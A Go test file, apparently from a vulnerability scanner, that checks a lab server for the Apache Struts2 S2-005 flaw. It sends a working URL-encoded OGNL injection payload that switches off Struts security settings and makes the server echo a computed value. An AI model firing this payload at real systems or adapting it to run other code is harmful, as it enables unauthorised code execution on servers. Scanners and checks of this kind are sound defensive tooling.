package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strconv"
	"strings"
	"testing"
)

func TestS2005(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	payload := "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29" +
		"%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodA" +
		"ccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&" +
		"%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperti" +
		"es%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%" +
		"29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionCont" +
		"ext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xm" +
		"an%5C75@org.apache.struts2.ServletActionContext@getResponse%2" +
		"8%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28" +
		"%29.println%28__rand_1__*__rand_2__%29%27%29%28d%29%29&%28i99" +
		"%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%2" +
		"9%29"
	payload = strings.ReplaceAll(payload, "__rand_1__", strconv.Itoa(rand1))
	payload = strings.ReplaceAll(payload, "__rand_2__", strconv.Itoa(rand2))
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080/example/HelloWorld.action"),
		Method:  "POST",
		Body:    payload,
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-005")
	}
}
